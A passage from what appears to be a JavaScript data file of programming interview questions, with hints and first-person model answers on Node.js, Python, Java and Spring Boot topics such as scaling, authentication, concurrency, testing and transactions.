      { q:'How do you scale a Node.js application to handle high traffic?', hint:'Cluster module (multi-core), PM2, horizontal scaling behind a load balancer, caching with Redis, connection pooling.', answer:`Node.js is single-threaded, so the first scaling step is using all CPU cores via the cluster module or PM2's cluster mode - this spawns a worker per core, each handling requests independently. For horizontal scaling, I run multiple Node.js instances behind a load balancer like AWS ALB or nginx, ensuring the app is stateless so any instance can serve any request. Session state lives in Redis rather than in-process memory. Database connection pooling - pg-pool for PostgreSQL, mongoose for MongoDB - prevents exhausting database connection limits as instances scale up. For CPU-intensive work, I offload it to worker_threads or a separate background queue (BullMQ with Redis) so the main event loop stays free for I/O. Caching frequently read, rarely written data in Redis dramatically reduces database pressure under high concurrency.` },
      { q:'Explain Node.js Streams - what are the four types and when do you use them?', hint:'Readable, Writable, Duplex, Transform. Streams process data in chunks without loading everything into memory. pipe() connects streams. Backpressure prevents overwhelming the consumer.', answer:`Node.js streams process data in chunks, making them essential for memory-efficient handling of large datasets. Readable streams produce data (fs.createReadStream, HTTP request bodies, database cursors). Writable streams consume data (fs.createWriteStream, HTTP response, process.stdout). Duplex streams are both readable and writable simultaneously (TCP sockets, WebSockets). Transform streams are duplex streams that modify data as it passes through (compression with zlib, encryption, CSV parsing). The pipe() method connects a readable to a writable and handles backpressure automatically - backpressure is the mechanism that pauses the producer when the consumer is overwhelmed, preventing memory buildup. A real example: processing a 2GB CSV upload without loading it into memory - I pipe the request body through a CSV parser Transform stream and insert records into the database in batches, keeping memory usage flat at a few megabytes regardless of file size.` },
      { q:'How do you implement authentication in a Node.js API - compare JWT and session-based approaches.', hint:'JWT: stateless, scalable, stored in memory/cookie, must handle refresh/revocation. Sessions: stateful, server stores state in Redis, simpler revocation, more server overhead.', answer:`JWT and session-based authentication trade off statelessness versus server-side control. JWTs are self-contained signed tokens - the server verifies the signature and reads claims without a database lookup, making them naturally stateless and well-suited for horizontal scaling and microservices. The tradeoff: revoking a JWT before expiry is hard without a token blacklist (which reintroduces state). I use short-lived access tokens (15 minutes) with longer-lived refresh tokens stored in httpOnly cookies, rotating refresh tokens on each use. Session-based authentication stores session state on the server (in Redis for distributed setups) and sends only a session ID to the client in a cookie. Revocation is instant - delete the session record. The tradeoff is the Redis lookup on every request and more operational complexity. I choose JWTs for stateless APIs and microservices; sessions for traditional server-rendered apps where instant revocation matters.` },
      { q:'What security best practices do you apply in a Node.js/Express application?', hint:'Helmet for HTTP headers, rate limiting, input validation (Joi/Zod), parameterised queries, HTTPS only, no sensitive data in logs, dependency auditing.', answer:`Security in Node.js starts with Helmet - it sets security-relevant HTTP headers (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options) with one line. Rate limiting with express-rate-limit prevents brute-force and DoS attacks on authentication endpoints. All user input is validated and sanitised at the boundary using Joi or Zod schemas before touching the application logic. Database queries always use parameterised statements - never string concatenation. Sensitive data (passwords, tokens) is never logged; I scrub request/response loggers to exclude authorization headers and body fields marked as sensitive. For authentication, bcrypt handles password hashing with an appropriate cost factor. Dependencies are audited with npm audit on every CI run and Dependabot raises PRs for vulnerable packages automatically. Environment variables hold all secrets - never hardcoded, never committed. CORS is configured explicitly with an allowlist rather than the open wildcard. I also set appropriate Content-Type headers and never send stack traces in production error responses.` },
    ],
    node: [
      { q:'What is middleware in Express.js and how does the middleware chain work?', hint:'Functions with (req, res, next). Executed in order - call next() to pass to next middleware. Can modify req/res or short-circuit.', answer:`Middleware in Express is simply a function with the signature (req, res, next). Express executes middleware in the order they are registered with app.use or on a specific route. Each middleware can read and modify the request and response objects, then either call next() to pass control to the next middleware in the chain, send a response to terminate the chain, or call next(err) to skip to the error-handling middleware. I structure middleware in layers: global middleware first (body parsing, CORS, logging, auth token verification), then route-level middleware for specific access control, then route handlers. The order matters significantly - placing auth middleware after route handlers would allow unauthenticated access. Custom error-handling middleware takes four parameters (err, req, res, next) and must be registered last.` },
      { q:'How do you handle file uploads, large payloads, or streaming data in Node.js?', hint:'Multer for file uploads, stream piping to avoid loading entire file in memory, busboy for multipart forms.', answer:`For file uploads I use Multer, which handles multipart/form-data and gives me control over where files land - disk storage for large files, memory storage for small ones that I immediately process or forward. The key principle for large data is streaming rather than buffering: instead of loading an entire file into memory with fs.readFile, I pipe readable streams directly to writable streams - for example, piping an uploaded file directly to S3 using the AWS SDK's Body parameter accepting a stream. For large request bodies I increase the body-parser limit only as needed and validate early. When building APIs that stream responses - Server-Sent Events, large CSV exports - I use res.write and the stream API to send chunks as they are ready rather than building the entire response in memory. This keeps memory footprint flat regardless of data size.` },
      { q:'How do you structure a large Node.js/Express project for maintainability?', hint:'Feature-based folder structure (not layer-based). Controller -> Service -> Repository layers. Dependency injection. Separate routes, middleware, models. Config from environment.', answer:`For large applications, I structure by feature rather than by layer. A layer-based structure puts all controllers in one folder, all services in another - when working on the "orders" feature you navigate across the entire project constantly. A feature-based structure keeps orders/orders.controller.js, orders/orders.service.js, and orders/orders.routes.js together, making each feature self-contained. Within each feature I maintain clear layer separation: routes handle HTTP parsing and validation, controllers coordinate the flow, services contain business logic, and repositories handle data access. Services do not import from other services directly - dependencies are injected so testing with mocks is straightforward. Configuration comes from environment variables via a central config module that validates required variables at startup (if DATABASE_URL is missing, fail loudly at startup, not at the first request). A central app.js only wires together the middleware and routes; business logic lives nowhere near it.` },
    ],
    python: [
      { q:'What are Python generators and how do they differ from regular functions?', hint:'Use yield instead of return. Lazy evaluation - values produced one at a time, not all at once. Memory-efficient for large sequences.', answer:'Python generators use yield instead of return, which suspends execution at that point and resumes from there on the next call. This lazy evaluation means values are produced one at a time rather than all at once, making generators extremely memory-efficient for large sequences - reading a large file line by line, paginating through API results, or generating infinite sequences. I use them regularly in data pipelines where loading everything into memory would be impractical. Generator expressions - like list comprehensions but with parentheses - provide clean, readable syntax for simple cases without needing a full function definition.' },
      { q:'Explain Python decorators and give a real example you have used.', hint:'Functions that wrap other functions. Common use cases: logging, auth checks, caching, timing, rate limiting.', answer:'A decorator is a function that takes another function as an argument, extends or modifies its behaviour, and returns a new function - without touching the original source code. I use decorators regularly: for timing and profiling critical code paths, for authentication and permission checks in web frameworks, for caching with functools.lru_cache, for retry logic on network calls, and for validating function arguments. The key to writing clean decorators is using functools.wraps to preserve the original function\'s metadata - name, docstring, signature - so debugging and introspection tools see the original function, not the wrapper.' },
      { q:'What is the difference between a list, tuple, set, and dictionary in Python? When do you use each?', hint:'List: ordered, mutable. Tuple: ordered, immutable (hashable). Set: unordered, unique. Dict: key-value, O(1) lookup.', answer:'I use a list when I need an ordered, mutable sequence - for example, collecting results I will append to and iterate over. A tuple is my choice for ordered, immutable data that should not change - function return values, database row representations, or dictionary keys where immutability is required for hashing. A set is ideal for membership testing and deduplication - adding to a set and checking containment are both O(1). A dictionary is my default for key-value lookups, counters, and structured data representations - O(1) average case for both reads and writes. Choosing the right structure from the start prevents both bugs and performance problems.' },
      { q:'How does Python manage memory and what is garbage collection in CPython?', hint:'Reference counting (primary) + cyclic garbage collector for reference cycles. Objects freed when ref count hits 0.', answer:'CPython manages memory primarily through reference counting - every object tracks the number of references pointing to it, and when that count reaches zero, the memory is immediately freed. The limitation is that pure reference counting cannot handle reference cycles - two objects pointing to each other with no external references. Python\'s cyclic garbage collector handles this by periodically scanning for groups of objects that are collectively unreachable from the rest of the program. The GIL - Global Interpreter Lock - prevents multiple threads from executing Python bytecode simultaneously, which is why CPU-bound parallel work in Python typically uses multiprocessing rather than threading, while threading remains effective for I/O-bound concurrency.' },
      { q:'What are Python context managers and how do you create a custom one?', hint:'with statement - ensures setup/teardown. Implement __enter__ and __exit__, or use @contextmanager decorator.', answer:'A context manager wraps a block of code with guaranteed setup and teardown logic, expressed with the with statement. The classic use case is file handling - the file is automatically closed when the block exits, even if an exception is raised. I implement custom context managers in two ways: the class-based approach with __enter__ and __exit__ dunder methods, which gives fine-grained exception handling control; and the @contextmanager decorator from contextlib, where a generator function with a yield in the middle is cleaner and more readable for most cases. I reach for them whenever I have resource acquisition with guaranteed release: database connections, distributed locks, temporary configuration overrides.' },
      { q:'How do you manage Python project dependencies and virtual environments?', hint:'venv or virtualenv for isolation, pip + requirements.txt or Poetry for dependency management. Pin versions for reproducibility. pyproject.toml is the modern standard.', answer:'I use virtual environments to isolate project dependencies so different projects can use different versions of the same library without conflict. The built-in venv module creates a lightweight environment; Poetry is my preferred tool for larger projects because it manages both dependency resolution and packaging in one place, using pyproject.toml as the single source of truth. Poetry\'s lock file ensures every team member and CI runner installs identical dependency versions, eliminating "works on my machine" issues. For pinning, I distinguish between direct dependencies (specified with constraints) and transitive dependencies (pinned exactly in the lock file). For Docker builds, I use pip with a requirements.txt generated from Poetry or pip-compile to get reproducible, hash-verified installs. I avoid installing packages globally - it leads to version conflicts and makes dependency auditing impossible.' },
      { q:'Explain asyncio in Python - when would you use it over threading or multiprocessing?', hint:'asyncio: single-threaded concurrent I/O via event loop. Threading: I/O-bound with blocking libs. Multiprocessing: CPU-bound (bypasses GIL). asyncio is most efficient for high-concurrency I/O.', answer:'Python\'s asyncio provides cooperative concurrency through an event loop - coroutines explicitly yield control with await when waiting for I/O, allowing other coroutines to run on the single thread. This makes it very efficient for high-concurrency I/O workloads - web scrapers, API clients, WebSocket servers - where most time is spent waiting for network responses. I choose asyncio when: the task is I/O-bound, libraries support async (aiohttp, httpx, asyncpg), and I need to handle many concurrent operations efficiently with low memory overhead. I choose threading when I must use blocking I/O libraries that do not support async. I choose multiprocessing for CPU-bound work - data transformation, image processing, ML inference - because the GIL prevents threads from running Python code in parallel. asyncio + multiprocessing in combination handles high-concurrency services that also need CPU-intensive processing.' },
      { q:'What is your approach to testing in Python? How do you use pytest effectively?', hint:'pytest: fixtures for setup/teardown, parametrize for data-driven tests, mocking with unittest.mock or pytest-mock. Structure: arrange-act-assert. Aim for fast, isolated tests.', answer:'pytest is my testing framework of choice for its clean syntax, powerful fixtures, and plugin ecosystem. Fixtures handle setup and teardown - a database connection fixture with session scope creates one connection for the entire test session, while function scope creates one per test. The @pytest.mark.parametrize decorator runs the same test with multiple input sets without duplication. I structure every test with clear Arrange-Act-Assert sections and keep tests independent - a test that depends on another test running first is fragile. For mocking, I use pytest-mock (a thin wrapper around unittest.mock) to replace external dependencies: HTTP calls, database queries, file system operations. I use pytest-cov to track coverage and fail the build if it drops below a threshold. Slow tests get marked with @pytest.mark.slow and are run separately from fast unit tests in CI, so the fast feedback loop for developers remains under 30 seconds.' },
      { q:'Explain Python class inheritance, MRO, and when to prefer composition over inheritance.', hint:'MRO: C3 linearization algorithm determines method resolution order in multiple inheritance. super() follows MRO. Prefer composition when "has-a" describes the relationship better than "is-a".', answer:'Python supports multiple inheritance - a class can inherit from multiple bases. The Method Resolution Order determines which method is called when a name exists in multiple classes in the hierarchy. Python uses the C3 linearisation algorithm, and you can inspect the order with ClassName.__mro__. super() in Python does not simply call the parent class - it calls the next class in the MRO, which is essential for cooperative multiple inheritance to work correctly. Understanding MRO prevents the diamond problem. For design choices, I apply the classic rule: use inheritance for is-a relationships where the subclass genuinely is a specialised version of the parent and shares its contract. Use composition - having an instance of another class as an attribute - for has-a relationships: a Car has an Engine rather than inheriting from it. Composition tends to produce more flexible, testable code because dependencies can be swapped, and it avoids the fragile base class problem where changing a parent breaks unrelated subclasses.' },
    ],
    java: [
      { q:'Explain the difference between abstract classes and interfaces in Java, and when to use each.', hint:'Abstract: shared code + state + partial implementation. Interface: pure contract, multiple inheritance, default methods (Java 8+).', answer:`I use abstract classes when I have a family of related classes that share both state and partial implementation - fields, constructors, and concrete methods that all subclasses will inherit. Abstract classes enforce an is-a relationship and prevent direct instantiation. Interfaces define a pure contract: a set of methods a class promises to implement, without caring about its inheritance chain. A class can implement multiple interfaces but extend only one abstract class, which makes interfaces the right tool for cross-cutting capabilities like Serializable, Comparable, or Runnable that unrelated classes need to support. Since Java 8, interfaces can have default and static methods, which somewhat blurs the line - but I still prefer interfaces when the relationship is behavioural rather than taxonomic, and abstract classes when subclasses genuinely share implementation logic and state.` },
      { q:'What is the difference between checked and unchecked exceptions in Java?', hint:'Checked: must be declared or caught (IOException, SQLException). Unchecked: RuntimeException subclasses (NullPointerException, IndexOutOfBoundsException).', answer:`Checked exceptions are enforced at compile time - any method that might throw one must either declare it in the method signature with throws or handle it with a try/catch block. They represent recoverable conditions the caller is expected to handle, like IOException when a file might not exist. Unchecked exceptions extend RuntimeException and require no declaration - they represent programming errors like null pointer access, array index out of bounds, or illegal argument values that callers generally cannot recover from and should not be cluttering every method signature. In modern Java, the trend has moved toward unchecked exceptions for library APIs because checked exceptions create heavy boilerplate and can leak implementation details through API signatures. I use checked exceptions for conditions where the caller genuinely needs to handle alternative paths, and runtime exceptions for contract violations.` },
      { q:'How does Java\'s garbage collector work and what are the different GC algorithms?', hint:'Mark-and-sweep, generational GC (Eden, Survivor, Old Gen). G1, ZGC, Shenandoah for low-latency workloads.', answer:`Java's garbage collector manages heap memory automatically. The generational hypothesis - most objects die young - drives the design: the heap is divided into Young Generation (Eden + two Survivor spaces) and Old Generation. Short-lived objects are collected frequently in minor GC, which is fast. Objects that survive enough minor GCs are promoted to Old Gen and collected less frequently in major GC. The original algorithms like CMS have been superseded. G1 (Garbage First) is the default since Java 9 - it divides the heap into equal-size regions and prioritises collecting regions with the most garbage, providing predictable pause times. For latency-critical applications - real-time bidding, trading systems - ZGC and Shenandoah provide sub-millisecond pauses regardless of heap size by doing most work concurrently with application threads. Tuning involves setting heap size bounds and, for G1, configuring the MaxGCPauseMillis target.` },
      { q:'Explain Java concurrency - what are the issues with shared mutable state and how do you address them?', hint:'Race conditions, deadlocks, visibility issues. Solutions: synchronized, volatile, java.util.concurrent, Atomic classes, immutable objects.', answer:`Shared mutable state between threads introduces three categories of bugs. Race conditions occur when two threads read and write the same variable without coordination, producing non-deterministic results. Deadlocks occur when two threads each hold a lock the other needs, waiting forever. Visibility issues occur when a thread's changes to shared variables are cached in CPU registers and not flushed to main memory, making them invisible to other threads. I address these in order of preference: first, immutability - if an object cannot be mutated, no coordination is needed. Second, confinement - keep data in one thread. When shared mutable state is necessary, I prefer the java.util.concurrent toolkit over raw synchronised blocks: AtomicInteger and AtomicReference for single variables, ConcurrentHashMap for maps, BlockingQueue for producer/consumer patterns. The volatile keyword guarantees visibility but not atomicity, so it is safe only for single-read-write operations.` },
      { q:'What are Java 8+ features you use regularly? Explain streams, lambdas, and Optional.', hint:'Lambda: anonymous function. Stream API: functional pipeline for collections. Optional: null-safe wrapper. Method references, default interface methods, CompletableFuture.', answer:`Java 8 transformed how I write everyday code. Lambdas provide concise anonymous functions - (s) -> s.toUpperCase() replaces verbose anonymous inner classes. The Stream API brings functional pipeline operations to collections: list.stream().filter(u -> u.isActive()).map(User::getName).sorted().collect(toList()) expresses complex transformations in a single readable pipeline without mutation. I use method references (User::getName) wherever the lambda simply delegates to an existing method - it is cleaner and signals intent. Optional<T> represents values that may be absent - it forces explicit handling of nullability at compile time rather than NPE at runtime. I use Optional as a return type for methods that may not produce a result, but avoid storing Optionals in fields or passing them as parameters. CompletableFuture provides composable async programming - I use it for parallel independent tasks and chaining async operations with thenApply and thenCompose.` },
      { q:'Explain the Java Collections Framework. How do you choose between ArrayList, LinkedList, HashMap, and TreeMap?', hint:'ArrayList: O(1) get, O(n) insert middle. LinkedList: O(1) insert at ends, O(n) get. HashMap: O(1) avg get/put (unordered). TreeMap: O(log n), sorted by key.', answer:`The right collection depends on the access patterns. ArrayList is backed by a resizable array - O(1) random access by index, O(1) amortized appending to the end, but O(n) for insertions and deletions in the middle (everything shifts). It is my default for lists where index-based access or iteration is primary. LinkedList uses doubly-linked nodes - O(1) insertion and deletion at either end, but O(n) for index-based access because it must traverse. I use it for queue and deque use cases, rarely for general lists. HashMap provides O(1) average case for get, put, and containsKey with no ordering guarantee. TreeMap stores entries sorted by key using a red-black tree - O(log n) operations but maintained sorted order, useful for range queries and when natural key ordering matters. LinkedHashMap preserves insertion order, useful for LRU caches with a slight overhead. For concurrent access, ConcurrentHashMap is the right choice rather than synchronizing a regular HashMap.` },
      { q:'What is Spring Framework and how does Dependency Injection work in it?', hint:'Spring IoC container manages object lifecycle. DI: inject dependencies rather than creating them. Constructor injection preferred. @Component, @Service, @Repository, @Autowired.', answer:`Spring is a comprehensive framework built around Inversion of Control - rather than objects creating their own dependencies, the Spring container creates and injects them. Dependency injection produces loosely coupled code where components declare what they need, not how to create it. Constructor injection is my preferred style: @Component public class OrderService { private final PaymentGateway gateway; @Autowired public OrderService(PaymentGateway gateway) { this.gateway = gateway; } }. This makes dependencies explicit, enables immutability (final fields), and simplifies testing - inject a mock in tests without any Spring context. The IoC container creates beans (Spring-managed objects) automatically from @Component, @Service, and @Repository annotations, or explicitly from @Bean methods in @Configuration classes. Scope matters: singleton (default) creates one instance per container; prototype creates a new instance per injection point. Understanding the container lifecycle prevents common mistakes like injecting prototype beans into singletons and wondering why they are not refreshing.` },
      { q:'What are common Java design patterns you have used? Explain Builder, Factory, and Singleton.', hint:'Builder: step-by-step object construction (avoids telescoping constructors). Factory: encapsulates object creation. Singleton: one instance per JVM. All from GoF.', answer:`The Builder pattern solves the telescoping constructor problem - when a class has many optional fields, constructors with every combination become unmanageable. Lombok @Builder or a hand-written inner Builder class allows: User user = User.builder().name("Alice").email("a@b.com").role(ADMIN).build(). Each field is optional; the build() method validates and constructs the final immutable object. The Factory pattern encapsulates object creation: a PaymentProcessorFactory creates the correct processor (StripeProcessor, PayPalProcessor) based on a config value, hiding the instantiation logic from the caller. The calling code only knows the PaymentProcessor interface. Singleton ensures one instance exists per JVM - typically implemented with a private constructor and a static getInstance() method or, cleaner in modern Java, an enum. I use enum singletons for thread safety without synchronisation overhead. The key question for Singleton is always whether global state is genuinely needed - singletons should be stateless services, not mutable state containers.` },
      { q:'How do you write clean, testable Java code? What testing tools and patterns do you use?', hint:'JUnit 5, Mockito, AssertJ. Unit tests with mocked dependencies. Integration tests with @SpringBootTest. Test pyramid: many unit, fewer integration, few E2E. Avoid Spring context in unit tests.', answer:`Clean, testable Java starts with dependency injection and single-responsibility design - code that creates its own dependencies is hard to test. I write unit tests with JUnit 5 and Mockito: Mockito.mock() creates a mock dependency, when().thenReturn() stubs its behaviour, verify() asserts it was called correctly. AssertJ provides a fluent assertion API that produces clear failure messages. For tests that need Spring context, @SpringBootTest starts the full application - I use this for integration tests covering database interaction and HTTP endpoints. @DataJpaTest spins up only the persistence layer, @WebMvcTest only the web layer, making test setup faster and more focused. I follow the test pyramid: many fast unit tests, fewer integration tests, a handful of E2E tests. The practical rule I follow: if a test needs a database or HTTP call, it is an integration test and belongs in a separate test source set that runs in CI but not on every local build. I measure coverage with JaCoCo and treat uncovered branches in business logic as a risk, not a target to game.` },
      { q:'Explain Java exception handling best practices. How do you design custom exceptions?', hint:'Catch specific before general. Checked for recoverable, unchecked for programming errors. Custom exceptions add semantic meaning. Do not swallow exceptions silently.', answer:`The most important rule in Java exception handling is never catch and swallow silently - catch (Exception e) {} is how you hide bugs that are expensive to find later. Catch the most specific exception type that makes sense, not Exception. Re-throw with context when you cannot handle an exception at the current layer: throw new OrderProcessingException("Failed to process order " + orderId, originalException) preserves the original cause while adding domain context. I design custom exception hierarchies around domain concepts: a top-level ApplicationException with subclasses like ValidationException, ResourceNotFoundException, and IntegrationException. This allows callers to catch at the appropriate level of specificity and makes global exception handlers in REST APIs produce correct HTTP status codes - ResourceNotFoundException maps to 404, ValidationException to 422. I use checked exceptions sparingly: only when the caller can meaningfully handle the exception in an alternate code path. For most business logic errors, unchecked RuntimeException subclasses produce cleaner code without the checked exception boilerplate propagating through every method signature.` },
    ],
    spring: [
      { q:'How does Spring Boot auto-configuration work, and how do you override or disable it?', hint:'@EnableAutoConfiguration + @Conditional annotations. spring.factories / AutoConfiguration.imports. @ConditionalOnMissingBean lets you override. Use exclude= to disable.', answer:`Spring Boot auto-configuration scans the classpath at startup and automatically creates beans based on what libraries are present. If spring-data-jpa and a DataSource are on the classpath, Spring Boot configures JPA, a transaction manager, and an entity manager automatically. This is implemented through @EnableAutoConfiguration loading auto-configuration classes listed in META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports. Each class uses @Conditional variants - @ConditionalOnClass, @ConditionalOnMissingBean, @ConditionalOnProperty - to activate only when conditions are met. To override auto-configuration I define my own bean of the same type: @ConditionalOnMissingBean ensures the auto-configured version is only created if mine does not already exist. To disable it entirely: @SpringBootApplication(exclude = {DataSourceAutoConfiguration.class}). Running with --debug prints a Conditions Report showing every auto-configuration decision and why it was applied or skipped - the first tool I reach for when a bean is not behaving as expected.` },
      { q:'Explain Dependency Injection and the IoC container in Spring. Why is constructor injection preferred?', hint:'IoC container manages bean lifecycle. Constructor injection: explicit, immutable, testable without Spring. Field injection hides deps. @Qualifier disambiguates. @Scope for singleton/prototype/request.', answer:`The Inversion of Control container is Spring's core - instead of objects creating their own dependencies, the container creates and injects them. A bean is any Spring-managed object annotated with @Component, @Service, @Repository, or @Controller. Constructor injection declares dependencies as constructor parameters and Spring injects them at construction time. Dependencies are explicit, fields can be final (immutable), and unit tests simply pass mock implementations directly to the constructor with no Spring context needed. Field injection with @Autowired on a field is convenient but hides dependencies, prevents immutability, and makes testing harder. @Qualifier disambiguates when multiple beans of the same type exist; @Primary marks the default. Scope controls lifecycle: singleton (default, one instance per context), prototype (new instance per injection), and request/session for web-scoped beans. Understanding scopes prevents a common bug: injecting a prototype bean into a singleton - the prototype is only injected once at construction and never refreshes.` },
      { q:'How does Spring Data JPA work? Explain derived queries, @Query, and handling the N+1 problem.', hint:'Extend JpaRepository for CRUD + pagination. Method names derive JPQL. @Query for custom SQL. N+1 solved by JOIN FETCH or @EntityGraph. Keep @Transactional at service layer.', answer:`Spring Data JPA generates repository implementations from interface method signatures. Extending JpaRepository<Entity, ID> provides CRUD, pagination, and sorting out of the box. Spring Data derives JPQL from method names: findByEmailAndStatus generates SELECT e FROM Entity e WHERE e.email = ?1 AND e.status = ?2. @Query allows custom JPQL or native SQL for complex queries that naming cannot express. Pagination takes a Pageable parameter and returns Page<T> containing both data and total count. The N+1 problem occurs when loading a list triggers N additional queries for each item's associations. I solve it with JOIN FETCH: SELECT o FROM Order o JOIN FETCH o.items WHERE o.userId = :userId fetches everything in one query. @EntityGraph on a repository method declaratively specifies which associations to eagerly load. I keep @Transactional at the service layer so multi-repository operations within one service method share a single transaction correctly.` },
      { q:'How do you configure Spring Security for a stateless REST API with JWT authentication?', hint:'SecurityFilterChain bean. STATELESS sessions. Custom OncePerRequestFilter extracts/validates JWT, sets SecurityContext. @PreAuthorize for method security. BCrypt passwords. Disable CSRF.', answer:`For a stateless REST API with JWT, the SecurityFilterChain bean disables session creation (SessionCreationPolicy.STATELESS), disables CSRF (not applicable to stateless APIs), and specifies which endpoints are public versus protected. A custom filter extending OncePerRequestFilter extracts the JWT from the Authorization Bearer header, validates the signature and expiration using a library like jjwt, and places a UsernamePasswordAuthenticationToken in the SecurityContextHolder. The SecurityContext is cleared after each request since there is no session. Passwords are hashed with BCryptPasswordEncoder - never stored plaintext. @PreAuthorize("hasRole('ADMIN')") on controller methods provides method-level authorization. For the login endpoint, authenticationManager.authenticate() validates credentials and a JWT is returned on success. Spring Security 6 (Boot 3.x) uses the lambda DSL exclusively - WebSecurityConfigurerAdapter is removed. The spring-security-oauth2-resource-server dependency simplifies JWT validation substantially if you use standard OIDC token configuration.` },
      { q:'How do you build and document REST APIs with Spring Boot? Explain validation and centralised error handling.', hint:'@RestController, ResponseEntity. @Valid + constraint annotations on DTOs. @ControllerAdvice + @ExceptionHandler for centralised errors. springdoc-openapi for Swagger UI. Problem Details RFC 9457.', answer:`@RestController combines @Controller and @ResponseBody. HTTP method annotations (@GetMapping, @PostMapping) map endpoints. @PathVariable, @RequestParam, and @RequestBody handle input. ResponseEntity<T> gives full control over status code and headers. Input validation uses Bean Validation: annotate DTO fields with @NotNull, @Size, @Email, and add @Valid on the @RequestBody parameter - Spring throws MethodArgumentNotValidException automatically on invalid input. Centralised error handling with a @ControllerAdvice class and @ExceptionHandler methods catches specific exceptions and returns consistent error DTOs: ResourceNotFoundException maps to 404, ValidationException to 422, unexpected exceptions to 500. Spring Boot 3 supports Problem Details (RFC 9457) out of the box via ProblemDetail response body. API documentation with springdoc-openapi auto-generates Swagger UI at /swagger-ui.html - @Operation and @Schema annotations enrich it. I treat the OpenAPI spec as the contract between frontend and backend teams, reviewing it in pull requests.` },
      { q:'Explain Spring Boot profiles and externalized configuration. How do you manage environment secrets?', hint:'application-dev.yml, application-prod.yml. @ConfigurationProperties for type-safe config. Secrets via env vars, never in version control. @Profile for env-specific beans. Spring Cloud Config for microservices.', answer:`Spring Boot layers configuration: application.yml provides defaults, application-{profile}.yml overrides per environment, and environment variables override everything. SPRING_PROFILES_ACTIVE=prod activates the production profile. Environment variables are the correct place for secrets - database passwords, API keys - because they are not committed to version control and are injected by the deployment platform (Kubernetes Secrets, AWS Parameter Store). @ConfigurationProperties(prefix = "app") binds a group of related properties to a typed Java class with IDE autocompletion, type safety, and validation - far superior to scattered @Value annotations. @Profile("dev") on @Configuration classes or @Bean methods activates beans only in specific environments, enabling mock implementations locally. Spring Cloud Config provides centralised configuration management: all microservice instances pull environment-specific config from a config server at startup and can refresh via /actuator/refresh without redeployment.` },
      { q:'What is Spring Boot Actuator and how do you integrate it with Prometheus and Grafana?', hint:'/actuator/health, /actuator/metrics, /actuator/loggers, /actuator/prometheus. Micrometer exports to Prometheus. Custom HealthIndicator. Secure non-health endpoints. Grafana dashboards.', answer:`Actuator exposes production-ready endpoints for monitoring without custom code. /actuator/health reports application health including database connectivity - I implement HealthIndicator beans for external dependencies like third-party APIs. /actuator/metrics exposes JVM memory, HTTP request counts, error rates, latency percentiles, and connection pool stats. /actuator/loggers lets me change log levels at runtime - enabling DEBUG on a specific package in production to diagnose a live issue without restarting. /actuator/info displays build version, git commit hash, and deployment timestamp injected at build time. Actuator integrates with Micrometer, a vendor-neutral metrics facade. Adding the micrometer-registry-prometheus dependency exposes /actuator/prometheus in Prometheus text format. I configure Prometheus to scrape it and build Grafana dashboards on the RED method - Request rate, Error rate, Duration. In production I expose only /health and /info without authentication and require Spring Security to protect all other Actuator endpoints.` },
      { q:'How do you test Spring Boot applications? Explain @SpringBootTest, @WebMvcTest, and @DataJpaTest.', hint:'@SpringBootTest: full context. @WebMvcTest: web layer + MockMvc. @DataJpaTest: JPA only + H2. @MockBean replaces beans in context. Unit tests with plain Mockito - fastest. Test pyramid.', answer:`Spring Boot test slices load only the relevant application layers, making tests fast and focused. @SpringBootTest starts the full application context - I use it for integration tests covering the complete request-response cycle, typically against a real test database. @WebMvcTest loads only the web layer (controllers, filters, converters) with MockMvc to simulate HTTP requests and assert responses without a real HTTP server or database - ideal for testing controller logic, validation, and error handling. @DataJpaTest loads only the JPA persistence layer with an embedded H2 database, testing repository queries and entity mappings against real SQL. @MockBean creates Mockito mocks registered in the Spring context, replacing real beans - I use it in @WebMvcTest to mock the service layer. For the service layer itself, plain JUnit 5 and Mockito unit tests run without any Spring context - the fastest tests. AssertJ provides fluent assertions. I follow the test pyramid: many unit tests, fewer web/JPA slice tests, minimal full @SpringBootTest integration tests.` },
      { q:'Explain @Transactional in Spring - propagation modes and common pitfalls.', hint:'REQUIRED (default), REQUIRES_NEW, SUPPORTS. Rollback on RuntimeException by default. rollbackFor for checked. Self-invocation bypasses proxy. readOnly = true for reads.', answer:`@Transactional wraps a method in a database transaction - Spring commits on normal return, rolls back on unchecked exceptions. Checked exceptions do not trigger rollback by default; specify rollbackFor = Exception.class when all exceptions should roll back. Propagation controls behaviour when one @Transactional method calls another. REQUIRED (default) joins an existing transaction or creates a new one. REQUIRES_NEW always starts a new transaction, suspending the existing one - useful for audit logging that must commit even if the outer transaction fails. SUPPORTS participates in a transaction if one exists but runs without one if not. The most common pitfall is self-invocation: calling a @Transactional method from another method in the same class bypasses Spring's AOP proxy, so the transaction annotation is silently ignored. The fix is to restructure so the call comes from a different bean, or use self-injection. @Transactional(readOnly = true) enables Hibernate read optimisations and signals intent clearly - I apply it to all service methods that only read data.` },
      { q:'How do you build microservices with Spring Cloud? What distributed systems challenges does it introduce?', hint:'Spring Cloud Gateway (API gateway), Eureka (service discovery), OpenFeign (REST clients), Resilience4j (circuit breakers), Micrometer Tracing (distributed tracing), Config Server.', answer:`Spring Cloud addresses distributed systems challenges. Eureka service discovery lets services register themselves and find each other by name instead of hardcoded IPs - the same application.name in Eureka and OpenFeign client annotation connects them. Spring Cloud Gateway is the API gateway: a single entry point with routing, rate limiting, authentication, and load balancing before requests reach services. OpenFeign generates REST clients from annotated interfaces - @FeignClient(name = "order-service") with method signatures eliminates RestTemplate boilerplate and integrates with service discovery automatically. Resilience4j provides circuit breakers that open when downstream error rates exceed a threshold, preventing cascading failures where one slow service brings down the whole system. Micrometer Tracing propagates trace IDs across HTTP calls so Zipkin or Jaeger can visualise the complete request path across 10 services. Spring Cloud Config Server centralises configuration so all instances pull their settings from one place. The honest challenge: microservices add significant operational complexity that is only justified at genuine team or scaling boundaries - a well-structured monolith is the better starting point for most applications.` },
    ],
    sql: [
